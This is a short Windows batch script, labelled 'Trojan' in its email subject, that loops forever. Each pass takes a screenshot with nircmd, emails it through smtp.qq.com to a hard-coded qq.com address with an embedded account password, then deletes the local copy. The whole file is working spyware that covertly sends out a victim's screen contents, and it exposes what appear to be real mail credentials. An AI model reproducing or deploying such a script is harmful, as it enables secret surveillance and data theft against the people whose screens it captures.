@echo off

PATH %CD%\bin

:loop

nircmd savescreenshot screen.png

mailsend -to 193319076@qq.com -from 193319076@qq.com -ssl -port 465 -auth-login -smtp smtp.qq.com -sub "Trojan" -user 193319076 -pass "dvvthnazrafcbhch" -attach screen.png

nircmd wait 30000

del screen.png

goto loop


